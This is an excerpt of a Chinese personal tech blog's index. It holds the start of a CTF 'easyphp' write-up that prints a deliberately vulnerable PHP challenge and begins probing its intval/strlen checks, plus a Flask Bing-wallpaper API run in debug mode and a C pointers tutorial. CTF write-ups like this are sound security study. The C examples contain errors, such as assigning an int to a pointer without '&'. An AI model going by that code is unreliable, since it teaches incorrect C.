title="Result"><p>OK，那么这就是本次博客的全部内容咯！如果喜欢记得给我留言点赞哦！</p>]]></content>
      
      
      <categories>
          
          <category> C语言佛系教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C语言 </tag>
            
            <tag> 函数 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctf题目讲解--001</title>
      <link href="/2022/11/08/ctf%E9%A2%98%E7%9B%AE%E8%AE%B2%E8%A7%A3-001/"/>
      <url>/2022/11/08/ctf%E9%A2%98%E7%9B%AE%E8%AE%B2%E8%A7%A3-001/</url>
      
        <content type="html"><![CDATA[<h3 id="写在前面："><a href="#写在前面：" class="headerlink" title="写在前面："></a>写在前面：</h3><ul><li>Ok,guys！那么从现在开始，我就会尝试写一下ctf比赛的解题攻略了，那么这是第一篇！</li></ul><h3 id="easyphp："><a href="#easyphp：" class="headerlink" title="easyphp："></a>easyphp：</h3><ul><li><p>首先第一步获取在线场景，得到网址。我们进入之后发现是php的代码。</p></li><li><p>接下来，老样子，对代码进行审计。<br>源代码是这样子的：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$key1</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$key2</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">6000000</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token string single-quoted-string">'8b184b'</span> <span class="token operator">===</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$key1</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Emmm...再想想"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Emmm..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$c</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword type-casting">array</span><span class="token punctuation">)</span><span class="token function">json_decode</span><span class="token punctuation">(</span>@<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span>@<span class="token variable">$c</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"m"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$c</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"m"</span><span class="token punctuation">]</span> <span class="token operator">&gt;</span> <span class="token number">2022</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span>@<span class="token variable">$c</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"n"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"n"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">2</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"n"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$d</span> <span class="token operator">=</span> <span class="token function">array_search</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"DGGJ"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"n"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$d</span> <span class="token operator">===</span> <span class="token constant boolean">false</span><span class="token operator">?</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no..."</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token class-name return-type">NULL</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"n"</span><span class="token punctuation">]</span> <span class="token keyword">as</span> <span class="token variable">$key</span><span class="token operator">=&gt;</span><span class="token variable">$val</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$val</span><span class="token operator">===</span><span class="token string double-quoted-string">"DGGJ"</span><span class="token operator">?</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no......"</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token class-name return-type">NULL</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$key2</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no hack"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$key1</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$key2</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">include</span> <span class="token string double-quoted-string">"Hgfks.php"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"You're right"</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span> Emmm...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>我们首先来看最终的条件，发现最终要包含Hgfks.php的话，必须要条件<code>$key1 &amp;&amp; $key2</code>，而key1=1以及key2=1的条件是由上面两个函数决定的。</p></li><li><p>那么，我们来重点看上面的判断条件。</p></li></ul><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">6000000</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token string single-quoted-string">'8b184b'</span> <span class="token operator">===</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$key1</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Emmm...再想想"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Emmm..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>第一个函数：<code>isset($a)</code>当变量a被设置，那么返回true，否则返回false。</p><p>第二个函数：<code>intval($a)</code>把变量a变成整数，那么如果是字符串呢？我们不妨实践一下：</p><p>首先在本地用phpstudy开一个服务器，新建一个ok.php用来实验。这里测试用的代码是这样的：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;br&gt;'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们发现：</p><p>1.如果<code>.index.php?a=abc</code>,那么就会结果是<code>0 3</code>,就是说如果a是字符串，那么intval均为0.</p><p>2.如果<code>.index.php?a=123</code>,那么就会结果是<code>123 3</code>,就是说a如果是数字，那么strlen会强制转换为字符串.</p><p>而括号中的判断条件很苛刻，既要<code>intval($a)&gt;6000000</code>又要<code>strlen($a)&lt;=3</code>这显然是野猪行为！</p><p>那么我们就换个思路，看看能否将它多余的进行闭合掉。</p>]]></content>
      
      
      <categories>
          
          <category> XCTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> XCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>写一个自动获取bing壁纸的接口</title>
      <link href="/2022/10/29/%E5%86%99%E4%B8%80%E4%B8%AA%E8%87%AA%E5%8A%A8%E8%8E%B7%E5%8F%96bing%E5%A3%81%E7%BA%B8%E7%9A%84%E6%8E%A5%E5%8F%A3/"/>
      <url>/2022/10/29/%E5%86%99%E4%B8%80%E4%B8%AA%E8%87%AA%E5%8A%A8%E8%8E%B7%E5%8F%96bing%E5%A3%81%E7%BA%B8%E7%9A%84%E6%8E%A5%E5%8F%A3/</url>
      
        <content type="html"><![CDATA[<p><img src="https://bingapi.littlewith.tk/?id=1" class="lazyload placeholder" data-srcset="https://bingapi.littlewith.tk/?id=1" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h3 id="注意：该接口和代码仅供学习使用！请勿将传回的壁纸用于非法用途！请尊重版权！树立版权意识！"><a href="#注意：该接口和代码仅供学习使用！请勿将传回的壁纸用于非法用途！请尊重版权！树立版权意识！" class="headerlink" title="注意：该接口和代码仅供学习使用！请勿将传回的壁纸用于非法用途！请尊重版权！树立版权意识！"></a>注意：该接口和代码仅供学习使用！请勿将传回的壁纸用于非法用途！请尊重版权！树立版权意识！</h3><hr><h3 id="由于读者自身行为导致的侵权，作者概不负责！"><a href="#由于读者自身行为导致的侵权，作者概不负责！" class="headerlink" title="由于读者自身行为导致的侵权，作者概不负责！"></a>由于读者自身行为导致的侵权，作者概不负责！</h3><hr><h3 id="Bing壁纸"><a href="#Bing壁纸" class="headerlink" title="Bing壁纸"></a>Bing壁纸</h3><ul><li>Bing的壁纸是每天更换的，而且更换的壁纸都很漂亮，而如何把它变成自己的博客幕布呢？于是想到做一个Bing壁纸的接口。</li><li>注：如果你不想折腾，那你可以直接使用我提供的接口:<a href="https://bingapi.littlewith.tk/?id=1">https://bingapi.littlewith.tk/?id=1</a></li><li>Bing在官方确实有给出具体的接口：网址为:<a href="http://cn.bing.com/HPImageArchive.aspx?format=js&amp;idx=0&amp;n=1">http://cn.bing.com/HPImageArchive.aspx?format=js&amp;idx=0&amp;n=1</a></li><li>官方接口返回的是json数据：<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span>  <span class="token property">"images"</span><span class="token operator">:</span> <span class="token punctuation">[</span>    <span class="token punctuation">{</span>      <span class="token property">"startdate"</span><span class="token operator">:</span> <span class="token string">"20221031"</span><span class="token punctuation">,</span>      <span class="token property">"fullstartdate"</span><span class="token operator">:</span> <span class="token string">"202210310700"</span><span class="token punctuation">,</span>      <span class="token property">"enddate"</span><span class="token operator">:</span> <span class="token string">"20221101"</span><span class="token punctuation">,</span>      <span class="token property">"url"</span><span class="token operator">:</span> <span class="token string">"/th?id=OHR.HohenzollernHechingen_ROW5987672369_1920x1080.jpg&amp;rf=LaDigue_1920x1080.jpg&amp;pid=hp"</span><span class="token punctuation">,</span>      <span class="token property">"urlbase"</span><span class="token operator">:</span> <span class="token string">"/th?id=OHR.HohenzollernHechingen_ROW5987672369"</span><span class="token punctuation">,</span>      <span class="token property">"copyright"</span><span class="token operator">:</span> <span class="token string">"Hohenzollern Castle, Swabian Alps, Baden-Württemberg, Germany (© Cornelia Dorr/eStock Photo)"</span><span class="token punctuation">,</span>      <span class="token property">"copyrightlink"</span><span class="token operator">:</span> <span class="token string">"https://www.bing.com/search?q=hohenzollern+castle+wiki&amp;form=hpcapt"</span><span class="token punctuation">,</span>      <span class="token property">"title"</span><span class="token operator">:</span> <span class="token string">"Info"</span><span class="token punctuation">,</span>      <span class="token property">"quiz"</span><span class="token operator">:</span> <span class="token string">"/search?q=Bing+homepage+quiz&amp;filters=WQOskey:%22HPQuiz_20221031_HohenzollernHechingen%22&amp;FORM=HPQUIZ"</span><span class="token punctuation">,</span>      <span class="token property">"wp"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>      <span class="token property">"hsh"</span><span class="token operator">:</span> <span class="token string">"99656c4ae8b11500b6806b76d858a527"</span><span class="token punctuation">,</span>      <span class="token property">"drk"</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span>      <span class="token property">"top"</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span>      <span class="token property">"bot"</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span>      <span class="token property">"hs"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token punctuation">}</span>  <span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token property">"tooltips"</span><span class="token operator">:</span> <span class="token punctuation">{</span>    <span class="token property">"loading"</span><span class="token operator">:</span> <span class="token string">"正在加载..."</span><span class="token punctuation">,</span>    <span class="token property">"previous"</span><span class="token operator">:</span> <span class="token string">"上一个图像"</span><span class="token punctuation">,</span>    <span class="token property">"next"</span><span class="token operator">:</span> <span class="token string">"下一个图像"</span><span class="token punctuation">,</span>    <span class="token property">"walle"</span><span class="token operator">:</span> <span class="token string">"此图片不能下载用作壁纸。"</span><span class="token punctuation">,</span>    <span class="token property">"walls"</span><span class="token operator">:</span> <span class="token string">"下载今日美图。仅限用作桌面壁纸。"</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li>接口中包含着今日壁纸的信息<code>"url": "/th?id=OHR.HohenzollernHechingen_ROW5987672369_1920x1080.jpg&amp;rf=LaDigue_1920x1080.jpg&amp;pid=hp"</code></li></ul><h3 id="制作的Python程序来获取美图"><a href="#制作的Python程序来获取美图" class="headerlink" title="制作的Python程序来获取美图"></a>制作的Python程序来获取美图</h3><ul><li><p>原理：使用requests模块获取数据后，进行字符串的拼接形成可访问的最终图片网址，再次通过requests请求图片缓存，最后通过flask传回获取到的数据。</p></li><li><p>最终实现的源码如下：</p></li><li><p>第1个文件</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/getpaper.py</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> time<span class="token keyword">import</span> json<span class="token keyword">import</span> wget<span class="token keyword">def</span> <span class="token function">get_json</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    headers <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token string">'User-Agent'</span><span class="token punctuation">:</span><span class="token string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"</span>    <span class="token punctuation">}</span>    resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>    jsoned <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>resp<span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    finalu <span class="token operator">=</span> jsoned<span class="token punctuation">[</span><span class="token string">'images'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> <span class="token string">"https://www.bing.com"</span> <span class="token operator">+</span> finalu    <span class="token keyword">pass</span><span class="token keyword">def</span> <span class="token function">get_dir</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    filename <span class="token operator">=</span> wget<span class="token punctuation">.</span>download<span class="token punctuation">(</span>url<span class="token operator">=</span>content<span class="token punctuation">,</span> out<span class="token operator">=</span><span class="token string">'./'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'.jpg'</span><span class="token punctuation">)</span>    <span class="token comment">#filenamed = filename.split("/")</span>    <span class="token keyword">return</span> filename    <span class="token keyword">pass</span><span class="token keyword">def</span> <span class="token function">get_data</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    headers <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token string">'User-Agent'</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"</span>    <span class="token punctuation">}</span>    respond <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>    <span class="token keyword">return</span> respond<span class="token punctuation">.</span>content    <span class="token keyword">pass</span><span class="token keyword">def</span> <span class="token function">done</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    content <span class="token operator">=</span> get_json<span class="token punctuation">(</span><span class="token string">"https://cn.bing.com/HPImageArchive.aspx?format=js&amp;idx=0&amp;n=1"</span><span class="token punctuation">)</span>    <span class="token comment">#result = get_dir(content)</span>    <span class="token comment"># result里面为文件路径以及文件名字</span>    result <span class="token operator">=</span> get_data<span class="token punctuation">(</span>content<span class="token punctuation">)</span>    <span class="token keyword">return</span> result    <span class="token keyword">pass</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>第2个文件</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/webmain.py</span><span class="token keyword">from</span> flask <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> flask<span class="token keyword">import</span> getpaper<span class="token keyword">import</span> osapp <span class="token operator">=</span> flask<span class="token punctuation">.</span>Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">back</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    filename <span class="token operator">=</span> getpaper<span class="token punctuation">.</span>done<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment">#image = open(filename, "rb+")</span>    resp <span class="token operator">=</span> Response<span class="token punctuation">(</span>filename<span class="token punctuation">,</span> mimetype<span class="token operator">=</span><span class="token string">"image/jpg"</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> resp<span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">"__main__"</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">4321</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>请将两个文件放在同一个目录，运行webmain.py中的内容</p></li><li><p>请勿将本程序运用于非法用途！</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Python Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python Web </tag>
            
            <tag> Python Crawl </tag>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>将Linux的ssh改为密钥登录</title>
      <link href="/2022/10/27/%E5%B0%86Linux%E7%9A%84ssh%E6%94%B9%E4%B8%BA%E5%AF%86%E9%92%A5%E7%99%BB%E5%BD%95/"/>
      <url>/2022/10/27/%E5%B0%86Linux%E7%9A%84ssh%E6%94%B9%E4%B8%BA%E5%AF%86%E9%92%A5%E7%99%BB%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><ul><li>习惯上我们喜欢使用putty等工具来远程ssh连接我们的Linux服务器，但是这样子会有一些不安全的地方。如果我们的密码设置过于简单那么很可能会被破解。那么</li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> Linux </tag>
            
            <tag> SSH </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>深入理解C语言中的数组与指针的关系问题</title>
      <link href="/2022/10/20/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3C%E8%AF%AD%E8%A8%80%E4%B8%AD%E7%9A%84%E6%95%B0%E7%BB%84%E4%B8%8E%E6%8C%87%E9%92%88%E7%9A%84%E5%85%B3%E7%B3%BB%E9%97%AE%E9%A2%98/"/>
      <url>/2022/10/20/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3C%E8%AF%AD%E8%A8%80%E4%B8%AD%E7%9A%84%E6%95%B0%E7%BB%84%E4%B8%8E%E6%8C%87%E9%92%88%E7%9A%84%E5%85%B3%E7%B3%BB%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h3 id="“偷懒”的C语言"><a href="#“偷懒”的C语言" class="headerlink" title="“偷懒”的C语言"></a>“偷懒”的C语言</h3><p>之所以取这个标题，是因为C语言真的很“懒”。</p><ul><li>“懒”表现在两个方面：</li></ul><hr><p>1.C语言是没有Bool类型和String类型的。<br>    在C语言的世界里，Bool类型是用int代替的，String类型是用char数组来代替的。</p><hr><p>比如，它要求你用0来表示false，用1来表示true。</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">while(i){    print "Hello World!";}//这句话只会在变量i为非0的时候执行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><hr><p>再比如，它要求你用字符数组或者指针来表示字符串。</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">char array[]="Hello,World!";//字符数组表示char *array="Hello,World!";//字符指针表示<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><hr><p>2.C语言的世界里，数组只保存数组头。<br>    C语言是不会将数组里的所有东西都记住的，它只会记住每个数组的头号元素。说人话就是：C语言是依靠数组第一个元素的标识来识别这个数组的。</p><hr><p>比如下面这段代码：</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">int array[3] = {1,2,3};//C语言只记住了这个数组中1元素的地址<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><hr><h3 id="灵活的黑魔法——“指针”"><a href="#灵活的黑魔法——“指针”" class="headerlink" title="灵活的黑魔法——“指针”"></a>灵活的黑魔法——“指针”</h3><p>提到指针，很多人会觉得：“这是个令人很头疼的问题”。而诚然，“指针”却是C语言的精髓所在。</p><hr><ul><li>指针的定义很简单：指向地址的变量。相信这个定义大家都能理解了。也就是指针本质上是个变量，只不过这个变量存着另一个变量的地址。按照指针里面的的地址进行，我们就能够到达对应变量的“区域”。</li></ul><hr><ul><li>那么这样子，我们访问一个变量就有两种方式了:</li></ul><hr><blockquote><p>1.我本来就熟悉a变量的家在哪儿(a变量的名字)。</p></blockquote><pre class="line-numbers language-C" data-language="C"><code class="language-C">int a=1;printf("a在这儿%d",a);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><hr><blockquote><p>2.我不知道a的家在哪儿，但是指针知道，我们找它问路。</p></blockquote><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token operator">*</span>pt <span class="token operator">=</span> a<span class="token punctuation">;</span> <span class="token comment">//告诉这个刚出生的指针，你的使命是存储a的地址</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"a在这儿%d"</span><span class="token punctuation">,</span><span class="token operator">*</span>pt<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" 